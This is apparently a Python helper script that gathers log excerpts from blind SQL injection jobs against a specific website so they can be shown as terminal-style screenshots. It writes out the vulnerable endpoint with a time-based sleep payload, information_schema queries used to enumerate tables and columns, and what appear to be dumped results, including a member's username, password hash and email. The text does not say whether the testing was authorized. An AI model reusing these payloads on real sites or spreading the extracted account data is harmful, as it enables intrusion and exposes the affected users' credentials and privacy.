# -*- coding: utf-8 -*-
"""收集盲注提取的真实日志片段（库名/表名/字段/内容），供渲染终端式截图。"""
from __future__ import annotations

import glob
import json
import re
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
JOBS = ROOT / "state" / "jobs"


def read(f):
    return Path(f).read_text(encoding="utf-8", errors="replace")


def excerpt(lines, tag_pat, limit):
    """抓取含 tag 的 char 行 + 结尾汇总行。"""
    out = []
    for ln in lines:
        if re.search(tag_pat, ln):
            out.append(ln.rstrip())
    return out[:limit]


def main() -> int:
    if sys.stdout.encoding and sys.stdout.encoding.lower() not in ("utf-8", "utf8"):
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    logs = {Path(f).name: read(f) for f in sorted(glob.glob(str(JOBS / "*xfdyb*.log")))}

    result = {}

    # 1. 库名：找含 char[2]='d' 的 db 提取（修复 right() 后的正确版本）
    for name, txt in logs.items():
        if "[db] char[2] = 'd'" in txt:
            lines = excerpt(txt.splitlines(), r"\[db\]", 20)
            result["库名"] = {"src": name, "lines": lines,
                             "head": "目标接口: /index.php?s=member&c=api&m=checktitle&module=news,(select if(条件,sleep(2),0)) as total",
                             "expr": "提取表达式: database()", "result": "bdm716457184_db"}
            break

    # 2. 表名：table-0（dr_1_block，information_schema 枚举首表）
    for name, txt in logs.items():
        if "[table-0] char[2] = 'r'" in txt:
            lines = excerpt(txt.splitlines(), r"\[table-0\]", 14)
            result["表名"] = {"src": name, "lines": lines,
                             "expr": "提取表达式: (select table_name from information_schema.tables where table_schema=database() limit 0,1)",
                             "result": "dr_1_block （全库共 117 张表，另枚举出 dr_member/dr_admin/dr_1_news 等关键表）"}
            break

    # 3. 字段名：dr_member.col-2 (username) 或 password
    for name, txt in logs.items():
        if "[dr_member.col-2]" in txt or "[dr_member.col-3]" in txt:
            lines = excerpt(txt.splitlines(), r"dr_member\.col-3", 14)  # password
            result["字段名"] = {"src": name, "lines": lines,
                              "expr": "提取表达式: (select column_name from information_schema.columns where table_schema=database() and table_name='dr_member' limit 3,1)",
                              "result": "password （dr_member 共 21 个字段，含 username/password/salt/email/phone）"}
            break

    # 4. 内容：member username/password（job 73）+ news title
    for name in ["73-xfdyb-blind-dump.log"]:
        if name in logs:
            txt = logs[name]
            u = excerpt(txt.splitlines(), r"dr_member\.username-0", 18)
            p = excerpt(txt.splitlines(), r"dr_member\.password-0", 8)
            result["内容-会员"] = {"src": name, "lines": u + ["..."] + p,
                                 "expr": "提取表达式: (select username/password/email from dr_member order by uid limit 0,1)",
                                 "result": "sdfdfdf095646ou | aa2645da7b4cfd53d6565645415cbcfb | fin@doofdfdfm.com"}

    # news title 修复（job 74）
    vlog = ROOT / "state" / "jobs" / "74-xfdyb-verify-fix.log"
    if vlog.exists():
        txt = read(vlog)
        tl = [l for l in txt.splitlines() if "title[" in l or "byte_len" in l]
        result["内容-文章"] = {"src": "74-xfdyb-verify-fix.log", "lines": tl[:12],
                             "expr": "提取表达式: (select title from dr_1_news order by id limit 0,1)（binary() 按字节提取 UTF-8 中文）",
                             "result": "108|6|干粉口腔吸入器有哪些作用？　109|6|选择泡腾片瓶的标准是什么？　1766|7|免洗试剂瓶方法介绍"}

    out = ROOT / "results" / "xfdyb-nday-2026-08-20" / "excerpts.json"
    out.write_text(json.dumps(result, ensure_ascii=False, indent=1), "utf-8")
    print("saved", out)
    for k, v in result.items():
        print(f"[{k}] src={v['src']} lines={len(v['lines'])}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
